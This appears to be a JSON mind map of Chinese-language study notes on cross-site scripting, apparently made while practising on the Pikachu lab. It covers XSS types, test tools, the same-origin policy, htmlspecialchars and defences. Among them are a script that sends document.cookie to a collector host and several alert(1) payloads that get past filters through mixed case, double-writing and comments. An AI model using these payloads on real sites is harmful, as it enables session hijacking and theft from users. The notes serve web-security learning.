{"root":{"data":{"id":"d6ozurgzjrc0","created":1735557689121,"text":"XSS跨站脚本攻击","priority":null,"progress":null},"children":[{"data":{"id":"d6ozvxsbjyg0","created":1735557781232,"text":"XSS简介","expandState":"expand","layout_mind_offset":{"x":-58,"y":22}},"children":[{"data":{"id":"d6ozwowd6c80","created":1735557840249,"text":"什么是XSS"},"children":[{"data":{"id":"d6ozwubvqtk0","created":1735557852071,"text":"XXS攻击目的是在网页中嵌入客户端恶意脚本\n最常用的攻击代码是JavaScript"},"children":[]}]},{"data":{"id":"d6ozwpbfhc00","created":1735557841160,"text":"XSS漏洞出现的原因"},"children":[{"data":{"id":"d6ozx1ub3fk0","created":1735557868423,"text":"程序对输入和输出的控制不够严格,导致\"精心构\n造“的脚本输入后,在输到前端时被浏览器当作有\n效代码解析执行从而产生危害"},"children":[]}]},{"data":{"id":"d6ozwpdypy80","created":1735557841313,"text":"XSS的危害","layout_right_offset":{"x":-4,"y":-21}},"children":[{"data":{"id":"d6ozxe5o38w0","created":1735557895231,"text":"劫持用户cookie           点击构造的链接触发劫持cookie","layout_right_offset":{"x":-11,"y":-8}},"children":[{"data":{"id":"d6ozxm4o68g0","created":1735557912585,"text":"http://ip:port/fi/?id=1\"><script>document.\nlocation = 'http://192.168.0.107/pikachu/\npkxss/xcookie/cookie.php?cookie='+\ndocument.cookie;</script>","layout_right_offset":{"x":32,"y":-8}},"children":[]}]},{"data":{"id":"d6ozxeg02w80","created":1735557895856,"text":"框架钓鱼","layout_right_offset":{"x":2,"y":-40}},"children":[]},{"data":{"id":"d6ozxf3a3so0","created":1735557897264,"text":"刷流量","layout_right_offset":{"x":5,"y":-44}},"children":[]},{"data":{"id":"d6ozxf5ells0","created":1735557897392,"text":"挂马","layout_right_offset":{"x":16,"y":-42}},"children":[]},{"data":{"id":"d6ozyg371zs0","created":1735557977799,"text":"键盘记录      需要设置跨域","layout_right_offset":{"x":-7,"y":-45}},"children":[]}]}]},{"data":{"id":"d6ozvyetaps0","created":1735557782592,"text":"XSS分类","expandState":"expand","layout_mind_offset":{"x":-56,"y":-43}},"children":[{"data":{"id":"d6ozzlqd7aw0","created":1735558068449,"text":"反射型XSS 中危"},"children":[{"data":{"id":"d6ozzz5aq5k0","created":1735558097650,"text":"交互的数据一般不会被存在在数据库里面,只是简\n单的把用户输入的数据反射给浏览器，一次性\n所见即所得。"},"children":[]}]},{"data":{"id":"d6ozzlxhnxc0","created":1735558068879,"text":"储存型XSS 高危"},"children":[{"data":{"id":"d6p0096g5f40","created":1735558119487,"text":"交互的数据会被存在在数据库里面,永久性存储,具\n有很强的稳定性"},"children":[]}]},{"data":{"id":"d6ozzlzqjnk0","created":1735558069015,"text":"DOM XSS 低危"},"children":[{"data":{"id":"d6p00b3hw4w0","created":1735558123662,"text":"不与后台服务器产生数据交互,通过前端的dom节\n点形成的XSS漏洞"},"children":[]}]}]},{"data":{"id":"d6ozvygwn3c0","created":1735557782718,"text":"XSS可能存在的地方  有输入有输出的地方都有可能存在XSS","layout_mind_offset":{"x":12,"y":-105},"expandState":"expand"},"children":[{"data":{"id":"d6p00rfxn4o0","created":1735558159243,"text":"HTML context"},"children":[]},{"data":{"id":"d6p00sqyo880","created":1735558162087,"text":"Attribute Context"},"children":[]},{"data":{"id":"d6p00tkpf0w0","created":1735558163885,"text":"URL Context"},"children":[]},{"data":{"id":"d6p016fcz8w0","created":1735558191860,"text":"Style Context"},"children":[]},{"data":{"id":"d6p016i6pgg0","created":1735558192031,"text":"Script Context"},"children":[]}]},{"data":{"id":"d6ozvyj69ds0","created":1735557782855,"text":"XSS测试方法","layout_mind_offset":{"x":-59,"y":-173},"expandState":"expand"},"children":[{"data":{"id":"d6p028738lk0","created":1735558274077,"text":"工具","layout_right_offset":{"x":27,"y":1}},"children":[{"data":{"id":"d6p02kmcnk80","created":1735558301122,"text":"APPscan、AWVS、Burpsuite 等","layout_right_offset":{"x":-15,"y":-27}},"children":[]},{"data":{"id":"d6p02sw8tvk0","created":1735558319134,"text":"半自动化工具\nBurpsuite、firefox(hackbar)、XSSER XSSF等","layout_right_offset":{"x":15,"y":-27}},"children":[]}]},{"data":{"id":"d6p02ib7fu00","created":1735558296094,"text":"手工","layout_right_offset":{"x":34,"y":-13}},"children":[{"data":{"id":"d6p033v6jiw0","created":1735558343014,"text":"最重要的是考虑那里有输入，输入的数据在什么\n地方输出","layout_right_offset":{"x":-6,"y":-3}},"children":[]}]}]},{"data":{"id":"d6ozvyll6rk0","created":1735557783001,"text":"同源策略","layout_mind_offset":{"x":52.33333320087877,"y":-69.66667236222133},"expandState":"expand"},"children":[{"data":{"id":"d6p064pwca00","created":1735558579964,"text":"什么是跨域"},"children":[{"data":{"id":"d6p06btaggw0","created":1735558595407,"text":"当协议、主机(主域名，子域名)、端口中的任意\n个不相同时，称为不同域。我们把不同的域之\n间请求数据的操作，成为跨域操作。","layout_left_offset":{"x":9,"y":-19}},"children":[]}]},{"data":{"id":"d6p065fas800","created":1735558581500,"text":"同源策略"},"children":[{"data":{"id":"d6p06ux8wio0","created":1735558637005,"text":"为了安全考虑，所有浏览器都约定了“同源策略\n，同源策略禁止页面加载或执行与自身来源不\n同的域的任何脚本既不同域之间不能使用JS进行\n操作。比如:x.com域名下的is不能操作y.com域\n名下的对象\n那么为什么要有同源策略? 比如一个恶意网站\n的页面通过is嵌入了银行的登录页面(二者不同\n源)，如果没有同源限制，恶意网页上的javascript\n即本就可以在用户登录银行的时候获取用户名和密码。","layout_left_offset":{"x":-30,"y":-25}},"children":[]}]},{"data":{"id":"d6p065lsgsw0","created":1735558581893,"text":"不受同源策略限止","layout_left_offset":{"x":-55,"y":-45}},"children":[{"data":{"id":"d6p07z3zh7c0","created":1735558724484,"text":"<script src=\"...\"> //加载本地js执行"},"children":[]},{"data":{"id":"d6p07zammq00","created":1735558724885,"text":"<img src=\"...\"> //图片"},"children":[]},{"data":{"id":"d6p08bds4g00","created":1735558751197,"text":"<link href=\"...\"> //css"},"children":[]},{"data":{"id":"d6p07zdsv4o0","created":1735558725077,"text":"<iframe src=\"...\"> //任意资源"},"children":[]}]},{"data":{"id":"d6p065xoleo0","created":1735558582612,"text":"同源策略修改","layout_left_offset":{"x":-17,"y":-35}},"children":[{"data":{"id":"d6p090vl1ls0","created":1735558806693,"text":"后台设置好Access-Control-Allow-Origin，设\n置为*，既允许所有人访问","layout_left_offset":{"x":-37,"y":0}},"children":[]}]}]},{"data":{"id":"d6p03hh61k00","created":1735558372642,"text":"JS攻击特征码","layout_mind_offset":{"x":-226.66665607028585,"y":-127.66667196485741}},"children":[{"data":{"id":"d6p0alb42i00","created":1735558929532,"text":"'\"><script>alert(1)</script>"},"children":[]},{"data":{"id":"d6p0ameim9c0","created":1735558931915,"text":"绕过大小写过滤\n'\"><SCriPt>alert(1)</\nSCriPT>","layout_left_offset":{"x":-90,"y":2}},"children":[]},{"data":{"id":"d6p0ami7o8g0","created":1735558932138,"text":"绕过内容过滤 用拼凑的方式 '\"><scrip<script>\nt>alert(1)</sc<script>ript>","layout_left_offset":{"x":-7,"y":-7}},"children":[]},{"data":{"id":"d6p0amluphk0","created":1735558932358,"text":"绕过内容过滤 用注释的方式'\"><sc<!--text-->\nript>alert(1)</scri<!--text-->pt>","layout_left_offset":{"x":-8,"y":-6}},"children":[]},{"data":{"id":"d6p0bzw1r540","created":1735559039637,"text":"将关键字进行url编码之后再插入 浏览器会识别"},"children":[]}]},{"data":{"id":"d6p0d3qvz880","created":1735559126396,"text":"XSS绕过","layout_mind_offset":{"x":-95.08333006542603,"y":-267.333331760433}},"children":[{"data":{"id":"d6p0do86m5c0","created":1735559170978,"text":"前端限制绕过"},"children":[]},{"data":{"id":"d6p0dpw2bz40","created":1735559174599,"text":"大小写混合"},"children":[]},{"data":{"id":"d6p0dpz2xps0","created":1735559174781,"text":"双写绕过"},"children":[]},{"data":{"id":"d6p0dq21eag0","created":1735559174960,"text":"编码"},"children":[]},{"data":{"id":"d6p0dq51whs0","created":1735559175142,"text":"注释干扰后台绕过"},"children":[]},{"data":{"id":"d6p0eb35l9k0","created":1735559220740,"text":"没有分号"},"children":[]},{"data":{"id":"d6p0eb640jk0","created":1735559220919,"text":"htmlspecialchars()函数","layout_left_offset":{"x":-11.249999832361937,"y":-67.4999989941715}},"children":[{"data":{"id":"d6p0fawg8ww0","created":1735559298699,"text":"htmlspecialchars()函数的作用","layout_left_offset":{"x":-11.249999832361937,"y":-14.999999776482696}},"children":[{"data":{"id":"d6p0fjyphuw0","created":1735559318426,"text":"& (和号)成为 &amp\n(双引号)成为 &quot\n(单引号)成为&#039\n<(小于)成为 &lt\n>(大于)成为 &gt","layout_left_offset":{"x":9.999999850988388,"y":-88.74999867752183}},"children":[]}]},{"data":{"id":"d6p0fb3v6mo0","created":1735559299147,"text":"htmlspecialchars()函数配置参数","layout_left_offset":{"x":-44.999999329447746,"y":-39.99999940395355}},"children":[{"data":{"id":"d6p0fld95sg0","created":1735559321482,"text":"可用的quotestyle类型:\nENT COMPAT-默认。仅编码双引号(可绕\n过)\nENT QUOTES-编码双引号和单引号(a标签可\n绕过)\nENT NOQUOTES-不编码任何引号","layout_left_offset":{"x":6.2499999068677425,"y":-48.749999273568505}},"children":[]}]}]}]},{"data":{"id":"d6p0g4phacg0","created":1735559363581,"text":"XSS常规防范","layout_mind_offset":{"x":-13.74999979510909,"y":-444.99999336898327}},"children":[{"data":{"id":"d6p0gh7fz7c0","created":1735559390788,"text":"对输入进行过滤，对输出进行html实体编码","layout_left_offset":{"x":-21.24999968335038,"y":-1.2499999813735485}},"children":[]},{"data":{"id":"d6p0gifs8yo0","created":1735559393469,"text":"加CDN 防护，代码层过滤，数据库层过滤，自\n己搭建防火墙，还可以开启 HttpOnly","layout_left_offset":{"x":-17.49999973922968,"y":-3.7499999441205887}},"children":[]}]}]},"template":"default","theme":"fresh-blue","version":"1.4.43"}